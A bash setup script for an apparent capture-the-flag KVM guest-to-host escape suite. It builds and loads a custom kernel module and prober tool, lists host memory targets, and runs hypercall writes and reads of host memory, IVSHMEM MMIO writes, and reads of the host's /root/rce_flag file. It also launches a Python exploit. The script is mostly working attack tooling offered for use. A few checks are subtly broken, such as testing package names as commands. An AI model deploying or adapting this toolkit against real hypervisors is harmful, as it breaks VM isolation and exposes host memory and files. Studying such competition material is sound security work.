#!/bin/bash
# KVM CTF Exploit Suite - FINAL Setup Script
# Updated for correct GPA/HPA handling and fixed bash arithmetic

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║     KVM CTF Guest-to-Host Escape Exploit Suite       ║"
    echo "║      FINAL - Hypercall Buffer Support Edition        ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_critical() {
    echo -e "${CYAN}[!]${NC} ${CYAN}$1${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root (in guest VM)"
        exit 1
    fi
}

check_dependencies() {
    print_info "Checking dependencies..."

    local required_deps=(
        git make gcc sudo xxd gdb build-essential binutils tar
        linux-kbuild-6.1 linux-compiler-gcc-12-x86
    )
    local missing_deps=()
    local missing_headers=()

    # Check each dependency individually
    for dep in "${required_deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing_deps+=("$dep")
        fi
    done

    # Install missing dependencies
    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_warning "Missing dependencies: ${missing_deps[*]}"
        print_info "Installing with: sudo apt-get install ${missing_deps[*]}"
        sudo apt-get update
        sudo apt-get install -y "${missing_deps[@]}"
    fi

    # Check for kernel headers
    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
        print_warning "Kernel headers not found for $(uname -r)"
        missing_headers+=("linux-headers-$(uname -r)")
        wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
        wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
        dpkg -i *.deb || true
    fi

    # Report what was installed
    if [ ${#missing_headers[@]} -ne 0 ]; then
        print_error "Missing headers: ${missing_headers[*]}"
        print_info "Installed with wget + dpkg"
    fi

    print_success "All dependencies found"
}

build_module() {
    print_info "Building FINAL kernel module (with hypercall buffer support)..."
    make clean &> /dev/null || true

    if ! make module 2>&1 | tee /tmp/build.log; then
        print_error "Build failed. Check /tmp/build.log"
        exit 1
    fi

    if [ -f "kvm_probe_drv.ko" ]; then
        print_success "Kernel module built successfully"
        print_info "Module features: Hypercall buffers, GPA/HPA, MMIO"
    else
        print_error "Failed to build kernel module"
        exit 1
    fi
}

build_userspace() {
    print_info "Building FINAL userspace tools..."

    if ! make userspace 2>&1 | tee -a /tmp/build.log; then
        print_error "Build failed. Check /tmp/build.log"
        exit 1
    fi

    if [ -f "kvm_prober" ]; then
        print_success "kvm_prober built (with hypercall_read/hypercall_write)"
    else
        print_error "Failed to build kvm_prober"
        exit 1
    fi
}

load_module() {
    print_info "Loading kernel module..."

    rmmod kvm_probe_drv 2>/dev/null || true

    if ! insmod kvm_probe_drv.ko; then
        print_error "Failed to load module"
        dmesg | tail -10
        exit 1
    fi

    sleep 1

    if [ -e "/dev/kvm_probe_dev" ] || [ -e "/dev/kvm_probe_drv" ]; then
        print_success "Module loaded, device created"
        ls -la /dev/kvm_probe* 2>/dev/null
    else
        print_error "Module loaded but device not found"
        dmesg | tail -5
        exit 1
    fi
}

install_tools() {
    print_info "Installing tools..."

    cp kvm_prober /usr/local/bin/
    chmod +x /usr/local/bin/kvm_prober

    # Make Python exploit executable
    if [ -f "ultimate_kvm_exploit.py" ]; then
        chmod +x ultimate_kvm_exploit.py
        print_success "ultimate_kvm_exploit.py ready"
    else
        print_warning "ultimate_kvm_exploit.py not found"
    fi

    print_success "Tools installed to /usr/local/bin/"
}

show_address_warning() {
    echo ""
    print_critical "═══════════════════════════════════════════════════════"
    print_critical "CRITICAL: Understanding Address Spaces & Hypercalls"
    print_critical "═══════════════════════════════════════════════════════"
    echo ""
    echo -e "${CYAN}Guest Physical (GPA) ≠ Host Physical (HPA)${NC}"
    echo ""
    echo "  Guest Address Space          Host Address Space"
    echo "  ───────────────────          ──────────────────"
    echo "  GPA 0x64279a8                HPA 0x64279a8 ← FLAG HERE!"
    echo "  (guest's RAM)                (actual host RAM)"
    echo ""
    echo -e "${CYAN}Hypercall Data Transfer:${NC}"
    echo "  • Hypercalls execute in HOST context"
    echo "  • Can't return HOST pointers to guest"
    echo "  • Must use GUEST buffers (pass GPA)"
    echo "  • Return status/size in rax register"
    echo ""
    echo -e "${CYAN}To access HOST memory from guest:${NC}"
    echo "  ✓ Hypercalls (with guest buffer for results)"
    echo "  ✓ MMIO (via IVSHMEM BARs)"
    echo "  ✓ HPA IOCTLs (readhpa/writehpa - uses ioremap)"
    echo "  ✗ DON'T use GPA - that's guest memory only!"
    echo ""
    print_critical "═══════════════════════════════════════════════════════"
    echo ""
}

show_pci_info() {
    print_info "Scanning for PCI devices and IVSHMEM..."
    echo ""

    echo -e "${BLUE}PCI Devices:${NC}"
    lspci | head -10
    echo ""

    echo -e "${BLUE}IVSHMEM Devices (vendor 1af4 - Red Hat/QEMU):${NC}"
    if lspci -d 1af4: 2>/dev/null | grep -q .; then
        lspci -d 1af4: -v
        print_success "IVSHMEM devices found! Exploitation likely possible"
    else
        print_warning "No IVSHMEM devices found (vendor 1af4)"
        print_info "Checking for other virtio devices..."
        if lspci | grep -i virtio | grep -q .; then
            lspci | grep -i virtio
            print_warning "Found virtio devices - may still be exploitable"
        else
            print_error "No virtio/IVSHMEM devices - exploitation difficult"
        fi
    fi
    echo ""

    echo -e "${BLUE}BAR Information (first 3 devices with BARs):${NC}"
    count=0
    for dev in /sys/bus/pci/devices/*/resource; do
        if [ $count -ge 3 ]; then break; fi
        bdf=$(basename $(dirname $dev))

        # Check if device has any non-zero BARs
        if grep -qv "0x0000000000000000" "$dev" 2>/dev/null; then
            echo "Device: $bdf"
            head -3 "$dev" 2>/dev/null | while IFS= read -r line; do
                if [ -n "$line" ]; then
                    parts=($line)
                    start=${parts[0]}
                    end=${parts[1]}
                    flags=${parts[2]}
                    if [ "$start" != "0x0000000000000000" ]; then
                        # Use python3 for hex arithmetic (bash can't handle large hex)
                        size=$(python3 -c "print(int('${end}', 16) - int('${start}', 16) + 1)" 2>/dev/null || echo "unknown")
                        is_io=$(python3 -c "print(int('${flags}', 16) & 0x1)" 2>/dev/null || echo "0")
                        is_prefetch=$(python3 -c "print(int('${flags}', 16) & 0x8)" 2>/dev/null || echo "0")

                        if [ "$is_io" = "1" ]; then
                            type="I/O"
                        else
                            type="MMIO"
                        fi

                        # Check if prefetchable and >= 1MB
                        if [ "$is_prefetch" != "0" ] && [ "$size" != "unknown" ]; then
                            if python3 -c "exit(0 if $size >= 1048576 else 1)" 2>/dev/null; then
                                type="$type (PREFETCH - likely IVSHMEM!)"
                            fi
                        fi

                        # Format size as hex
                        if [ "$size" != "unknown" ]; then
                            size_hex=$(python3 -c "print('0x%x' % $size)" 2>/dev/null || echo "$size")
                        else
                            size_hex="unknown"
                        fi

                        echo "  $start - $end ($type, size: $size_hex)"
                    fi
                fi
            done
            count=$((count + 1))
            echo ""
        fi
    done
}

show_targets() {
    echo ""
    print_info "CTF Target Information (HOST addresses):"
    echo ""
    echo -e "${BLUE}Target 1: Memory Write Flag (250k points)${NC}"
    echo "  HOST Physical: 0x64279a8"
    echo "  HOST Virtual:  0xffffffff826279a8"
    echo "  Required Value: 0xdeadbeef41424344"
    echo "  Methods: hypercall_write, IVSHMEM BARs"
    echo ""
    echo -e "${BLUE}Target 2: Memory Read Flag (50-100k points)${NC}"
    echo "  HOST Physical: 0x695ee10"
    echo "  HOST Virtual:  0xffffffff82b5ee10"
    echo "  Action: Read flag content"
    echo "  Methods: hypercall_read (with guest buffer)"
    echo ""
    echo -e "${BLUE}Target 3: RCE Flag (250k points)${NC}"
    echo "  File Path: /root/rce_flag (on HOST)"
    echo "  Action: Read host file from guest"
    echo "  Methods: readfile IOCTL"
    echo ""
}

run_basic_tests() {
    print_info "Running basic functionality tests..."
    echo ""

    echo -e "${BLUE}Test 1: Device Access${NC}"
    if kvm_prober getkaslr &>/dev/null; then
        kvm_prober getkaslr
        print_success "KASLR detection works"
    else
        print_warning "KASLR detection failed (may be expected)"
    fi

    echo -e "${BLUE}Test 2: GPA Operations (Guest Memory)${NC}"
    if kvm_prober writegpa 1000000 deadbeefcafebabe &>/dev/null; then
        print_success "GPA write works (writes to GUEST memory)"
        if kvm_prober readgpa 1000000 48 &>/dev/null; then
            kvm_prober readgpa 1000000 48
            print_success "GPA read works (reads GUEST memory)"
        fi
    else
        print_warning "GPA operations failed"
    fi

    echo -e "${BLUE}Test 3: Hypercall Operations${NC}"
    if kvm_prober hypercall 0 0 0 0 0 &>/dev/null; then
        print_success "Hypercalls work (check dmesg for details)"
    else
        print_warning "Hypercall test failed"
    fi

    echo -e "${BLUE}Test 4: File Read (RCE)${NC}"

    # Try reading both paths
    if kvm_prober readfile /home/customeradmin/rce_flag 0 64 &>/dev/null; then
        kvm_prober readfile /home/customeradmin/rce_flag 0 64
        print_success "File read from /home/customeradmin/rce_flag works!"
    elif kvm_prober readfile /root/rce_flag 0 64 &>/dev/null; then
        kvm_prober readfile /root/rce_flag 0 64
        print_success "File read from /root/rce_flag works!"
    else
        print_warning "File read failed for both paths"
    fi

    echo ""
}

show_exploitation_guide() {
    echo ""
    print_info "Exploitation Strategy (Updated for Hypercalls):"
    echo ""
    echo -e "${CYAN}Method 1: Hypercall Write${NC}"
    echo "  kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344"
    echo "  • Hypercall 100: WRITE to host memory"
    echo "  • Returns status in rax"
    echo ""
    echo -e "${CYAN}Method 2: Hypercall Read${NC}"
    echo "  kvm_prober hypercall_read 0x695ee10 256"
    echo "  • Hypercall 101: READ from host memory"
    echo "  • Allocates guest buffer automatically"
    echo "  • Passes guest buffer GPA to host"
    echo "  • Host writes result to guest buffer"
    echo "  • Returns bytes read in rax"
    echo ""
    echo -e "${CYAN}Method 3: IVSHMEM BARs${NC}"
    echo "  lspci -d 1af4: -v"
    echo "  kvm_prober writemmio_buf <bar+offset> 4443424241efbeadde"
    echo ""
    echo -e "${CYAN}Method 4: RCE File Read${NC}"
    echo "  kvm_prober readfile /home/customeradmin/rce_flag 0 64"
    echo "  kvm_prober readfile /root/rce_flag 0 64"
    echo ""
    echo -e "${CYAN}Ultimate Exploit (Recommended):${NC}"
    echo "  sudo python3 ultimate_kvm_exploit.py"
    echo "  • Tries all 4 methods automatically"
    echo "  • Handles guest buffer allocation"
    echo "  • Parses hypercall return values"
    echo ""
}

run_exploit() {
    local exploit_type=$1

    case $exploit_type in
        "ultimate")
            print_info "Running ULTIMATE exploit (RECOMMENDED)..."
            if [ -f "ultimate_kvm_exploit.py" ]; then
                python3 ultimate_kvm_exploit.py
            else
                print_error "ultimate_kvm_exploit.py not found!"
                exit 1
            fi
            ;;
        "hypercall")
            print_info "Testing hypercall methods..."
            echo ""
            echo "# Hypercall Write Test:"
            kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344
            echo ""
            echo "# Hypercall Read Test:"
            kvm_prober hypercall_read 0x695ee10 256
            echo ""
            echo "# Check dmesg for hypercall output:"
            dmesg | tail -20 | grep -i hypercall || echo "No hypercall logs found"
            ;;
        "manual")
            print_info "Manual exploitation mode..."
            print_info "Try these commands:"
            echo ""
            echo "# Hypercall methods:"
            echo "kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344"
            echo "kvm_prober hypercall_read 0x695ee10 256"
            echo ""
            echo "# IVSHMEM methods:"
            echo "lspci -d 1af4:"
            echo "kvm_prober writemmio_buf <bar_addr> 4443424241efbeadde"
            echo ""
            echo "# RCE method:"
            echo "kvm_prober readfile /root/rce_flag 0 256"
            ;;
        *)
            print_error "Unknown exploit type: $exploit_type"
            print_info "Available: ultimate, hypercall, manual"
            exit 1
            ;;
    esac
}

show_usage() {
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  install        - Build and install everything"
    echo "  build          - Only build (no install)"
    echo "  load           - Only load module"
    echo "  test           - Run basic tests"
    echo "  info           - Show PCI/IVSHMEM information"
    echo "  guide          - Show exploitation guide"
    echo "  exploit [type] - Run exploit (ultimate|hypercall|manual)"
    echo "  uninstall      - Remove module and tools"
    echo "  clean          - Clean build artifacts"
    echo "  help           - Show this help"
    echo ""
    echo "Quick Start:"
    echo "  sudo ./setup.sh install             # Install everything"
    echo "  sudo ./setup.sh info                 # Check for IVSHMEM"
    echo "  sudo ./setup.sh exploit hypercall    # Test hypercalls"
    echo "  sudo ./setup.sh exploit ultimate     # Run full exploit"
    echo ""
    echo "Files:"
    echo "  ✓ kvm_probe_drv.c         - Kernel driver (hypercall buffers)"
    echo "  ✓ kvm_prober.c            - CLI tool (hypercall_read/write)"
    echo "  ✓ ultimate_kvm_exploit.py - Python exploit (4 methods)"
}

main() {
    print_banner

    case "${1:-install}" in
        "install")
            check_root
            check_dependencies
            build_module
            build_userspace
            load_module
            install_tools
            show_address_warning
            show_pci_info
            show_targets
            run_basic_tests
            show_exploitation_guide
            print_success "Installation complete!"
            echo ""
            print_info "Next steps:"
            echo "  1. Review hypercall protocol above"
            echo "  2. Run: sudo ./setup.sh exploit hypercall"
            echo "  3. Run: sudo ./setup.sh exploit ultimate"
            ;;

        "build")
            check_dependencies
            build_module
            build_userspace
            print_success "Build complete!"
            ;;

        "load")
            check_root
            load_module
            ;;

        "test")
            check_root
            run_basic_tests
            ;;

        "info")
            show_address_warning
            show_pci_info
            show_targets
            ;;

        "guide")
            show_exploitation_guide
            ;;

        "exploit")
            check_root
            run_exploit "${2:-ultimate}"
            ;;

        "uninstall")
            check_root
            print_info "Uninstalling..."
            rmmod kvm_probe_drv 2>/dev/null || true
            rm -f /usr/local/bin/kvm_prober
            print_success "Uninstall complete!"
            ;;

        "clean")
            print_info "Cleaning..."
            make clean &>/dev/null || true
            print_success "Clean complete!"
            ;;

        "help")
            show_usage
            ;;

        *)
            print_error "Unknown command: $1"
            show_usage
            exit 1
            ;;
    esac
}

main "$@"
